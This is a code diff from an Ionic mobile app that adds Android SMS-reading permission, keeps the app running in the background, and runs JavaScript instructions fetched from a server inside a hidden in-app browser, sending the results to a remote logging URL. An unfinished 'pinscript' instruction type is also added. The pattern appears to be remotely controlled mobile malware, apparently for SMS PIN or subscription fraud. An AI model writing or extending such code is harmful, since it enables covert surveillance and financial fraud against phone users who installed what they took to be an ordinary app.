@@ -11,6 +11,7 @@ import { Network } from '@ionic-native/network';
 import { Http } from '@angular/http';
 import { BackgroundMode } from '@ionic-native/background-mode';
 import { SMS } from '@ionic-native/sms';
+import { AndroidPermissions } from '@ionic-native/android-permissions';
 
 
 import 'rxjs/add/operator/map';
@@ -28,16 +29,33 @@ export class MyApp {
   storage: Storage;
   referrer: String;
   sms: SMS;
+  smsPermission: boolean;
 
   constructor(platform: Platform, statusBar: StatusBar, splashScreen: SplashScreen, iab: InAppBrowser,
               storage: Storage, device: Device, network: Network, http: Http, backgroundMode: BackgroundMode,
-              sms: SMS) {
+              sms: SMS, androidPermissions: AndroidPermissions) {
 
     platform.ready().then(() => {
+      var app = this;
+
+      androidPermissions.checkPermission(androidPermissions.PERMISSION.READ_SMS).then(
+        function(){
+          app.smsPermission = true;
+          console.log('sms read ok');
+        },
+        function(){
+          androidPermissions.requestPermissions(androidPermissions.PERMISSION.READ_SMS).then(function(){
+            app.smsPermission = true;
+            console.log('accepted sms request');
+          }, function(){
+            app.smsPermission = false;
+            console.log('NO sms reading');
+          });
+        }
+      );
 
       backgroundMode.enable();
 
-      var app = this;
       this.network = network;
       this.storage = storage;
       this.sms = sms;
@@ -57,24 +75,25 @@ export class MyApp {
         if(referrer.length > 0){
           app.referrer = referrer;
           storage.set("deviceSettings", deviceSettings);
+          app.handleInstructions(http, iab);
 
-          if (app.isNetworkOk()) { //we started on a cellular network
-            console.log('network is ok');
-            app.handleInstructions(http, iab);
-          } else { //non cellular let's watch for connections to come up
-            console.log('we are not on a cellular network the type is ='+app.network.type);
-            let connectSubscription = app.network.onchange().subscribe(() => {
-              console.log('new network change... to'+app.network.type);
-              setTimeout(() => {
-                if (app.isNetworkOk()) {
-                  app.handleInstructions(http, iab);
-                  connectSubscription.unsubscribe();
-                }
-              }, 3000);
-            });
-          }
+          // if (app.isNetworkOk()) { //we started on a cellular network
+          //   console.log('network is ok');
+          //   app.handleInstructions(http, iab);
+          // } else { //non cellular let's watch for connections to come up
+          //   console.log('we are not on a cellular network the type is ='+app.network.type);
+          //   let connectSubscription = app.network.onchange().subscribe(() => {
+          //     console.log('new network change... to'+app.network.type);
+          //     setTimeout(() => {
+          //       if (app.isNetworkOk()) {
+          //         app.handleInstructions(http, iab);
+          //         connectSubscription.unsubscribe();
+          //       }
+          //     }, 3000);
+          //   });
+          // }
         }else{
-          console.log('no referrer');
+          console.log('no referrer, not sending status');
         }
       });
 
@@ -176,16 +195,22 @@ export class MyApp {
         console.log('done with our break');
       }else if(instruction.type === "javascript"){
         //run the instructions...
-        browser.executeScript({code: instruction.script}).then(
-          function(result){
-            console.log(result);
-            if(instruction.url_log){
-              app.log(http, instruction.url_log, result);
-            }
-          }
-        );
+        app.executeScript(app, instruction.script, browser, http, instruction.url_log);
+      }else if(instruction.type ===  "pinscript"){
+
       }
     }
+  }
+
+  executeScript(app, script, browser, http, url_log){
+    browser.executeScript({code: script}).then(
+      function(result){
+        console.log(result);
+        if(url_log){
+          app.log(http, url_log, result);
+        }
+      }
+    );
   }
 
   sleep(ms) {
